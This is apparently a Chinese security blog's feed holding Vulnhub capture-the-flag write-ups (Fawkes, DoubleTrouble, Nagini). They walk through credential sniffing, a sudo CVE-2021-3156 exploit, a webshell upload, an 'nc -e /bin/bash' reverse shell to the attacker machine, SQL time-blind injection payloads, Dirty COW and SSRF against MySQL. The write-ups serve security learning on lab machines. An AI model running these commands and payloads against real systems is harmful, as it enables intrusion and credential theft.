<p>利用工具<code>tcpdump</code>分析流量： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /bin/sh <span class="comment"># 切换到root</span></span><br><span class="line">tcpdump -i eth0 port 21</span><br></pre></td></tr></table></figure></p>
<p>过了一会开始有了数据包：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416175319.png" /></p>
<p>前面的3个为tcp握手过程，注意红框中的信息：</p>
<ul>
<li>第一个红框：ftp的语法，USER后面跟的是要登录的用户名</li>
<li>第二个红框：服务器要求对方输入密码</li>
<li>第三个红框：ftp语法，PASS后面跟的是密码</li>
<li>第四个红框：登陆失败</li>
</ul>
<p>又获得一个用户名和密码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: neville</span><br><span class="line">password: bL!Bsg3k</span><br></pre></td></tr></table></figure></p>
<p>尝试登录另一个端口的ssh</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416175507.png" /></p>
<p>登录成功，并且成功来到真实的靶机。</p>
<h2 id="权限提升">2.6 权限提升</h2>
<p>这次靶机的提权涉及到一个漏洞<code>CVE-2021-3156</code>，参考资料在[[#靶机信息]]中给出。msf中也存在可利用的代码。</p>
<p>首先，先利用msf中的auxiliary模块登录ssh创建一个会话 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole <span class="comment"># 打开msfconsole</span></span><br><span class="line">use auxiliary/scanner/ssh/ssh_login</span><br><span class="line"><span class="built_in">set</span> RHOST 10.0.2.16</span><br><span class="line"><span class="built_in">set</span> username neville</span><br><span class="line"><span class="built_in">set</span> password bL!Bsg3k</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416193905.png" /></p>
<p>然后执行下面命令： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search cve-2021-3156</span><br><span class="line">use 0</span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line"><span class="built_in">set</span> lport 5555</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
<p>但是提示失败了</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416194156.png" /></p>
<p>命名存在该漏洞，但是却失败了这是为什么呢。通过下载<a href="https://github.com/worawit/CVE-2021-3156">CVE-2021-3156</a>中的<code>expoit_nss.py</code>，查看其中源码（只列出部分） <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> cdll, c_char_p, POINTER, c_int, c_void_p</span><br><span class="line">SUDO_PATH = <span class="string">b&quot;/usr/bin/sudo&quot;</span></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br></pre></td></tr></table></figure></p>
<p>注意其中的<code>SUDO_PATH</code>，我们查看靶机上sudo的路径如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416194714.png" /></p>
<p>所以需要修改，然后exp就可以成功利用了。将修改之后的文件传给靶机 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">靶机: nc -lvnp 4444 &gt; exp.py</span><br><span class="line">kali: nc 10.0.2.16 4444 &lt; cve-2021-3156Exp.py -w 1</span><br></pre></td></tr></table></figure></p>
<p>提权成功！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416195127.png" /></p>
<p>接着就可以查看剩下的两个flag了，一个在<code>/home/nevile/horcrux2.txt</code>，还有一个在<code>/root/horcrux3.txt</code>，内容如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// horcrux2.txt</span><br><span class="line">horcrux_&#123;NzogTmFHaU5pIHRIZSBTbkFrZSBkZVN0cm9ZZWQgQnkgTmVWaWxsZSBMb25HYm9UVG9t&#125;</span><br><span class="line"></span><br><span class="line">// horcrux3.txt</span><br><span class="line">__     __    _     _                           _     _     </span><br><span class="line">\ \   / /__ | | __| | ___ _ __ ___   ___  _ __| |_  (_)___ </span><br><span class="line"> \ \ / / _ \| |/ _` |/ _ \ &#x27;_ ` _ \ / _ \| &#x27;__| __| | / __|</span><br><span class="line">  \ V / (_) | | (_| |  __/ | | | | | (_) | |  | |_  | \__ \</span><br><span class="line">   \_/ \___/|_|\__,_|\___|_| |_| |_|\___/|_|   \__| |_|___/</span><br><span class="line">                                                           </span><br><span class="line">     _       __            _           _ </span><br><span class="line">  __| | ___ / _| ___  __ _| |_ ___  __| |</span><br><span class="line"> / _` |/ _ \ |_ / _ \/ _` | __/ _ \/ _` |</span><br><span class="line">| (_| |  __/  _|  __/ (_| | ||  __/ (_| |</span><br><span class="line"> \__,_|\___|_|  \___|\__,_|\__\___|\__,_|</span><br><span class="line">                                         </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Machine Author: Mansoor R (@time4ster)</span><br><span class="line">Machine Difficulty: Hard</span><br><span class="line">Machine Name: Fawkes</span><br><span class="line">Horcruxes Hidden in this VM: 3 horcruxes</span><br><span class="line"></span><br><span class="line">You have successfully pwned Fawkes machine &amp; defeated Voldemort.</span><br><span class="line">Here is your last hocrux: horcrux_&#123;ODogVm9sRGVNb3JUIGRFZmVBdGVkIGJZIGhBcnJZIFBvVFRlUg==&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com</span><br></pre></td></tr></table></figure></p>
<p>将其中的base64编码的部分解码得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// horcrux2.txt</span><br><span class="line">7: NaGiNi tHe SnAke deStroYed By NeVille LonGboTTom</span><br><span class="line"></span><br><span class="line">// horcrux3.txxt</span><br><span class="line">8: VolDeMorT dEfeAted bY hArrY PoTTeR</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">3 总结</h1>
<p>该靶机的难度为高，我认为主要是涉及了许多关于二进制的渗透方法，其他攻击方法还是比较简单的。</p>
<p>其次，还涉及了之前没有的FTP服务攻击技术。</p>
<p>最后，通过抓包分析得到ssh用户名和密码也是非常新颖的。</p>
<h2 id="aslr技术">3.1 ASLR技术</h2>
<p>ASLR（Address Space Layout Randomization，地址空间随机化）技术通过加载程序的时候使用不固定的基址加载，从而干扰shellcode定位的一种保护机制。</p>
<p>需要注意以下几点：</p>
<ul>
<li>它并不能解决漏洞，而是增加了利用漏洞的难度；</li>
<li>它不追踪或报告漏洞</li>
<li>不能对编译时没有开启ASLR支持的二进制文件提供保护</li>
<li>不能避免被绕过</li>
</ul>
<p>通过对攻击者在进行缓冲区溢出攻击时所要用到的内存布局中的偏移做了随机化，ASLR 加大了攻击成功的难度，从而增强了系统的控制流完整性。</p>
<p>在Linux中可以通过下面两条命令查看是否开启该功能： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. cat /proc/sys/kernel/randomize_va_space</span><br><span class="line">2. sysctl -a --pattern randomize</span><br></pre></td></tr></table></figure></p>
<p><code>randomize_va_space</code>的值有三个： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 = Disabled</span><br><span class="line">1 = Conservative Randomization</span><br><span class="line">2 = Full Randomization</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>FTP服务攻击</tag>
        <tag>流量抓包分析</tag>
        <tag>堆溢出漏洞攻击:CVE-2021-3156</tag>
        <tag>缓冲区溢出漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>13 Vulnhub DoubleTrouble Writeup</title>
    <url>/2022/04/18/13%20Vulnhub%20DoubleTrouble%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度为简单，漏洞其实都不难发现，主要的难点在于第一台靶机隐写图片的发现和破解以及第二台靶机的sql注入漏洞的发现。</p>
<span id="more"></span>
<h1 id="靶机信息">1 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li>https://www.vulnhub.com/entry/doubletrouble-1,743/</li>
</ul>
<p>难度：</p>
<ul>
<li>简单</li>
</ul>
<p>目标：</p>
<ul>
<li>取得两台靶机root权限</li>
<li>拿到两个flag</li>
</ul>
<p>涉及攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>Web信息收集</li>
<li>开源CMS漏洞利用</li>
<li>文件上传</li>
<li>隐写术</li>
<li>密码爆破</li>
<li>GTFObins提权</li>
<li>SQL盲注</li>
<li><strong>脏牛提权</strong></li>
</ul>
<h1 id="渗透第一台靶机">2 渗透——第一台靶机</h1>
<p>攻击主机kali: 10.0.2.4</p>
<h2 id="主机发现端口扫描端口服务发现">2.1 主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.17</span><br><span class="line">sudo nmap -p22,80 -A 10.0.2.17</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418091054.png" /></p>
<p>得到如下信息：</p>
<ul>
<li>22端口的服务为ssh</li>
<li>80端口的服务为http，版本为Apache2.4.38</li>
<li>靶机操作系统为Debian</li>
</ul>
<h2 id="访问http服务">2.2 访问http服务</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418091209.png" /></p>
<p>得到一个登陆界面，经尝试，发现不知道邮箱无法登录，也不存在sql注入。但是下面的两行内容很奇怪，点击发现来到了<code>qdPM</code>官网，发现，这是一个开源的CMS，最新的版本是9.2，而靶机的是9.1，因而查看了一下更新日志，除了找到几个路径之外（路径扫描也能扫出来），没有其他收获。</p>
<blockquote>
<p>找到开源CMS的时候，需要查看一下更新的记录，里面有时候会记载类似“修复了xxx漏洞”信息。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418091401.png" /></p>
<p>搜索了一下该CMS的默认账号密码如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin@localhost.com</span><br><span class="line">admin</span><br></pre></td></tr></table></figure></p>
<p>但是无法登录。去GitHub上找了源码，但是检查了所有文件发现都没有任何有用的信息，链接如下：</p>
<ul>
<li>https://github.com/dodiksunaryo/qdpm</li>
</ul>
<p>最后，还是进行路径扫描，发现了许多文件（在查看源码的时候也看到了）</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418091804.png" /></p>
<p>一一查看之后还是没有什么信息。<code>/secret</code>中放着一张图片，本来没什么重要的，但是这个目录的名字像是一个提示，因此联想到可能这张图片经过了隐写！</p>
<h2 id="隐写术密码破解">2.3 隐写术密码破解</h2>
<p>首先将图片下载到kali，然后使用<code>steghide</code>进行查看</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418092027.png" /></p>
<p>发现需要输入密码，因此进而确定该图片隐写了某些内容。此时利用一款新的工具<code>stegseek</code>，官网：</p>
<ul>
<li>https://github.com/RickdeJager/stegseek</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">stegseek --seed doubletrouble.jpg <span class="comment"># 检测信息</span></span><br><span class="line">stegseek --crack doubletrouble.jpg rockyou.txt <span class="comment"># 提取信息</span></span><br></pre></td></tr></table></figure>
<p>最后得到一个文件<code>doubletrouble.jpg.out</code>，查看其中的内容，得到两串字符： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">otisrush@localhost.com</span><br><span class="line">otis666</span><br></pre></td></tr></table></figure></p>
<p>看这个格式像是之前登录界面的邮箱和密码，尝试登陆，发现进入了后台！</p>
<h2 id="get-shell">2.4 get shell</h2>
<p>这里有两种办法：</p>
<ul>
<li>第一种，利用msf搜索<code>searchsploit qdpm 9.1</code>，然后使用红框的exp即可（红框的是最新的，但是和前一个利用的是一样的漏洞。不过代码有点乱，需要自己整理一下） <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418092814.png" /></li>
<li>第二种，在后台我也找到了对应的文件上传点，可以直接上传后门，没有任何拦截</li>
</ul>
<p>接下来主要介绍第二种，第一种很简单，修改一下代码传到靶机执行就可以了。</p>
<p>进入后台之后，我首先查看了配置里面的信息，发现了疑似文件上传点</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418093052.png" /></p>
<p>然后我上传了一个php文件，提示如下</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418093153.png" /></p>
<p>但是问题是，没给上传文件的路径。这时候我想到了路径扫描的时候扫到了一个<code>/uploads</code>，就去查看了一下，功夫不负有心人，终于被我找到了，在<code>10.0.2.17/uploads/users</code>里面放着上传的文件（我还以为不成功，上传了许多次）</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418093326.png" /></p>
<p>接下来直接蚁剑上线即可。</p>
<h2 id="权限提升">2.5 权限提升</h2>
<p>在蚁剑的shell上输入<code>nc -e /bin/bash 10.0.2.4 3333</code>将shell反弹到kali。可以升级一下shell（需要注意，靶机没有python3）。</p>
<p>然后输入<code>sudo -l</code>查看的时候，发现了如下信息</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418093801.png" /></p>
<p>然后去了<a href="https://gtfobins.github.io/">GTFOBins</a>发现了可以利用这个配置不当从而提权，命令如下： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418094017.png" /></p>
<p>查看<code>/root</code>发现了又一台虚拟机，先将该虚拟机传给kali，然后通过共享文件夹传到主机，最后再启动 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">靶机: nc 10.0.2.4 4444 &lt; doubletrouble.ova -w 1 # 传输完1s后自动断开</span><br><span class="line">kali: nc -lvnp 4444 &gt; doubletrouble2.ova</span><br></pre></td></tr></table></figure></p>
<h1 id="渗透第二台靶机">3 渗透——第二台靶机</h1>
<h2 id="主机发现端口扫描端口服务发现-1">3.1 主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.18</span><br><span class="line">sudo nmap -p22,80 -A 10.0.2.18</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418094403.png" /></p>
<p>信息如下：</p>
<ul>
<li>22端口的服务为ssh</li>
<li>80端口的服务为http</li>
<li>靶机的操作系统为Debian</li>
<li><strong>Linux内核为3.x</strong></li>
</ul>
<h2 id="访问http服务get-shell">3.2 访问http服务、get shell</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418094543.png" /></p>
<p>不论输入什么，这个页面都没有任何回应（就离谱，给我的感觉就是做了个登录界面，并没有登录这个功能）</p>
<p>路径扫描也没有其他结果：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418094824.png" /></p>
<p>因此，漏洞只可能出现在登录界面，但是不论输入什么都没有任何反应。使用sqlmap，可以发现漏洞，因此直接用sqlmap扫： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -r r.txt -p uname --dbs -&gt; doubletrouble, information_schema</span><br><span class="line">sqlmap -r r.txt -p uname -D doubletrouble --tables -&gt; users</span><br><span class="line">sqlmap -r r.txt -p uname -D doubletrouble -T users --columns -&gt; username, password</span><br><span class="line">sqlmap -r r.txt -p uname -D doubletrouble -T users -C username,password --dump</span><br></pre></td></tr></table></figure></p>
<p>最终得到如下信息：</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">username</th>
<th style="text-align: center;">password</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">montreux</td>
<td style="text-align: center;">GfsZxc1</td>
</tr>
<tr class="even">
<td style="text-align: center;">clapton</td>
<td style="text-align: center;">ZubZub99</td>
</tr>
</tbody>
</table>
<p>然后去登陆界面登录，发现两个都登录不上。首先这不太可能是错误的消息，那么只有一种可能，那就是并不是登录界面的用户名和密码。在端口扫描中发现了22端口有着ssh服务，因此尝试连接，发现第二个用户和密码可以连接的上。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418101134.png" /></p>
<h2 id="权限提升-1">3.3 权限提升</h2>
<p>首先查看了sudo配置，发现该靶机都没有sudo命令。suid权限也没有获得有用的信息。但是查看内核时发现，该靶机的Linux内核比较的老</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418101313.png" /></p>
<p>因此，可能存在内核漏洞，这里介绍脏牛漏洞<a href="https://github.com/FireFart/dirtycow">dirty</a></p>
<blockquote>
<p>该漏洞利用dirtycow漏洞的pokemon漏洞利用作为基础，自动生成新的passwd行。运行二进制文件时，将提示用户输入新密码。然后将原始 /etc/passwd 文件备份到 /tmp/passwd.bak 并用生成的行覆盖 root 帐户。运行漏洞利用后，您应该能够使用新创建的用户登录。</p>
</blockquote>
<p>将exp放到靶机上，然后编译执行即可，注意要进入可读可写的目录，比如<code>/tmp</code>。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line">./dirty</span><br></pre></td></tr></table></figure></p>
<p>然后需要输入新的密码。该漏洞会创建一个名为<code>firefart</code>的用户，但是拥有root权限</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418101933.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418102252.png" /></p>
<hr />
<p>脏牛提权后，利用下述命令恢复原来的<code>/etc/passwd</code>： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mv /tmp/passwd.bak /etc/passwd</span><br></pre></td></tr></table></figure></p>
<hr />
<p>接下来查看两个flag，第一个在<code>/root/root.txt</code>，第二个在<code>/home/clapton/user.txt</code> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// root.txt</span><br><span class="line">1B8EEA89EA92CECB931E3CC25AA8DE21</span><br><span class="line"></span><br><span class="line">// user.txt</span><br><span class="line">6CEA7A737C7C651F6DA7669109B5FB52</span><br></pre></td></tr></table></figure></p>
<p>靶机到此结束！</p>
<h1 id="总结">4 总结</h1>
<p>该靶机的难度确实不算难，不过还是存在着几个难点：</p>
<ul>
<li>第一台靶机的隐写术密码爆破</li>
<li>第二台靶机的时间盲注的<strong>发现</strong></li>
</ul>
<p>我感觉第二台靶机只是做了一个登录界面，将我们输入的内容带入MySQL进行查询，不论结果对错，也不论是否有语法错误，都没有任何提示。现实情况下总会有不同的提示的，所以这里是一个难点。</p>
<h2 id="sql注入时间盲注">4.1 SQL注入——时间盲注</h2>
<p>如果后台语句为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where username=&#x27;.$_POST[&quot;uname&quot;].&#x27; and password=&#x27;.$_POST[&quot;psw&quot;].&#x27;;</span><br></pre></td></tr></table></figure></p>
<p>那么只需要<code>uname=1'and sleep(5)#&amp;psw=1</code>即可，此时： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where username=&#x27;1&#x27;and sleep(5)#&#x27; and password=&#x27;1&#x27;;</span><br></pre></td></tr></table></figure></p>
<p>但是该靶机不行，此时小技巧： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&#x27; and(select x from (select (sleep(3)))alia)#</span><br></pre></td></tr></table></figure></p>
<p>解释：</p>
<p>此时，不论后台语句如何，至少存在 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&#x27; and(select x from(select (sleep(5)))alia)#</span><br></pre></td></tr></table></figure></p>
<p>那么先查询<code>select (sleep(3))</code>，直接触发，然后将返回的结果起个别名<code>alia</code>，最后执行<code>select x from alia</code>，因为<code>alia</code>中必定不存在<code>x</code>，所以没有返回结果，因此最终呈现的效果就是页面返回的时间被延迟了。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418104149.png" /></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>隐写术</tag>
        <tag>开源CMS漏洞利用</tag>
        <tag>GTFObins提权</tag>
        <tag>SQL注入</tag>
        <tag>脏牛提权</tag>
      </tags>
  </entry>
  <entry>
    <title>14 Vulnhub Nagini Writeup</title>
    <url>/2022/04/22/14%20Vulnhub%20Nagini%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度比较高，有许多知识点之前没有涉及过。</p>
<span id="more"></span>
<h1 id="靶机信息">靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/harrypotter-nagini,689/">HarryPotter: Nagini ~ VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>中、高难度</li>
</ul>
<p>目标：</p>
<ul>
<li>取得root权限</li>
<li>拿到3个flag</li>
</ul>
<p>涉及攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>Web信息收集</li>
<li><strong>HTTP3协议</strong></li>
<li>域名绑定</li>
<li><strong>SSRF漏洞</strong>（Gopher+MySQL）</li>
<li>Joomla漏洞</li>
<li>SSH公钥登录</li>
<li><strong>浏览器密码还原</strong></li>
</ul>
<h1 id="前置知识">前置知识</h1>
<h2 id="gopher协议">Gopher协议</h2>
<p><a href="Gopher协议.md">Gopher协议</a></p>
<h2 id="http3协议">HTTP3协议</h2>
<p><a href="HTTP3协议.md">HTTP3协议</a></p>
<h2 id="ssrf漏洞">SSRF漏洞</h2>
<p><a href="SSRF.md">SSRF</a></p>
<h1 id="渗透">渗透</h1>
<p>kali: 10.0.2.4</p>
<h2 id="主机发现端口扫描端口服务发现">主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.22</span><br><span class="line">sudo nmap -p22,80 -A 10.0.2.22</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422170113.png" /></p>
<p>信息：</p>
<ul>
<li>22端口的服务为ssh</li>
<li>80端口的服务为http，版本为Apache 2.4.38</li>
<li>靶机操作系统为Debian</li>
</ul>
<h2 id="访问http服务">访问http服务</h2>
<p>直接访问80端口，发现网页非常的干净，只有一张图片，没办法，只能使用路径扫描。这里需要注意的是dirsearch扫描的不全，要么自己指定字典，或者就是配合gobuster一起使用。</p>
<p>利用dirsearch扫描出了两个： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.html</span><br><span class="line">/joomla/</span><br></pre></td></tr></table></figure></p>
<p>可以对后者继续进行扫描，会扫出很多东西。后者其实是一个开源的CMS，可以在GitHub上找到源码：<a href="https://github.com/joomla/joomla-cms">GitHub - joomla/joomla-cms: Home of the Joomla! Content Management System</a></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422170617.png" /></p>
<p>重要的其实是这个，将其下载下来，得到许多配置信息（直接将.bak后缀删掉就可以打开了），重要的是</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422170925.png" /></p>
<p>因此可以知道靶机上存在着MySQL数据库，并且用户名和数据库都写在这里面了。这些信息后面用到。</p>
<p>后来我就尝试访问了下扫描出来的路径，得到两个登陆界面，第一个是普通用户登录界面</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422171108.png" /></p>
<p>第二个是后台登录界面</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422171121.png" /></p>
<p>原本以为是利用开源CMS的漏洞来获得shell，于是利用msf查看了靶机上joomla的版本，最后确定是3.9.25，也就是不存在可以利用的漏洞。默认的账号和密码也不能够登录。万般无奈之下，尝试用gobuster再次扫描，这回得到了一个文件note.txt <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.22/ -w /usr/share/dirb/wordlists/common.txt -x txt,php,html,jsp,asp</span><br></pre></td></tr></table></figure></p>
<hr />
<p>也可以使用： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.43 -f -e html,php,txt -w [字典地址]</span><br></pre></td></tr></table></figure></p>
<p>指定字典，效果有时候会比不带字典好，但是速度慢。</p>
<hr />
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422171543.png" /></p>
<p>访问该文件得到如下内容：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422171621.png" /></p>
<p>要求我们访问HTTP3的服务端，并且给出了域名。</p>
<h2 id="域名绑定和http3协议">域名绑定和HTTP3协议</h2>
<h3 id="域名绑定">域名绑定</h3>
<p>这台靶机通过上有多个Web应用，但是端口都是在80端口，因此推测通过访问不同的域名可以访问到该靶机上不同的Web应用。因此，需要先进行域名绑定。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/hosts</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422171902.png" /></p>
<p>此时还不能访问，因为该域名的使用的是HTTP3协议，因此需要先下载HTTP3协议工具。</p>
<h3 id="http3协议工具">HTTP3协议工具</h3>
<blockquote>
<p>需要提前安装carrgo, cmake</p>
</blockquote>
<p>工具地址：<a href="https://github.com/cloudflare/quiche">GitHub - cloudflare/quiche: 🥧 Savoury implementation of the QUIC transport protocol and HTTP/3</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --recursive https://github.com/cloudflare/quiche</span><br><span class="line">cargo build --examples  <span class="comment"># 需要进入到quiche目录</span></span><br><span class="line"><span class="built_in">cd</span> quiche/target/debug/examples</span><br><span class="line">./http3-client https://quic.nagini.hogwarts 或者 ./http3-client https://10.0.2.22</span><br></pre></td></tr></table></figure>
<p>得到如下内容：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422172803.png" /></p>
<p>这里其实得到两条信息：</p>
<ul>
<li>让我们访问/internalResourceFeTcher.php</li>
<li>让我们查看配置文件的备份，及configruation.php.bak。上面看过的</li>
</ul>
<hr />
<p>如果rustc报错，先卸载当前的，然后下载，命令如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">卸载: sudo apt purge rustc</span><br><span class="line">下载: </span><br><span class="line">	curl --proto &#x27;=https&#x27; --tlsv1.2 -sSf https://sh.rustup.rs | sh</span><br><span class="line">	弹出互动，输入1</span><br><span class="line">	然后输入：source $HOME/.cargo/env</span><br></pre></td></tr></table></figure></p>
<hr />
<h2 id="ssrf-mysql">SSRF + MySql</h2>
<p>直接访问：10.0.2.22/internalResourceFeTcher.php</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422172743.png" /></p>
<p>经过测试发现，这里存在着SSRF漏洞。又根据提示，查看配置文件，发现里面有MySQL数据库的相关信息，因此猜测这里应该使用SSRF攻击MySql数据库，从而获取数据库中的信息。</p>
<p>利用工具：<a href="https://github.com/tarunkant/Gopherus">GitHub - tarunkant/Gopherus: This tool generates gopher link for exploiting SSRF and gaining RCE in various servers</a></p>
<p>使用方式很简单：<code>./gopherus.py --exploit mysql</code>，如果是不同的数据库，后面修改一下就可以</p>
<h3 id="查看数据库中有哪些表">查看数据库中有哪些表</h3>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422173341.png" /></p>
<p>然后将生成的url粘贴到网页中的输入框，这里可能会不成功，多刷新几次就好了</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422173441.png" /></p>
<p>发现joomla数据库下有许多的表，我们主要关注一个叫做<code>joomla_users</code>的表，这里最有可能存在着用户的登录信息。</p>
<h3 id="查看表下的字段">查看表下的字段</h3>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422173716.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422174138.png" /></p>
<p>def后面跟着的分别是“数据库、表名、字段名”这些信息。如果看的不清楚可以按F12然后查看</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422174354.png" /></p>
<p>我们只需要关注有一个字段为email，其后一个字段为密码，其前一个字段为username。因此<code>site_admin@nagini,hogwarts</code>这个应该是email，那么后面跟着的就是密码，前面就是用户名site_admin。可以尝试破解该密码，但是并不推荐，这里推荐直接修改掉site_admin的密码。</p>
<h3 id="修改site_admin密码">修改site_admin密码</h3>
<p>先生成一个md5的密码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(hdfzzf㉿kali)-[~]</span><br><span class="line">└─$ echo -n &quot;pass&quot; | md5sum</span><br><span class="line">1a1dc91c907325c69271ddf0c944bc72  -</span><br></pre></td></tr></table></figure></p>
<p>注意，一定要加-n。然后</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422175005.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422175046.png" /></p>
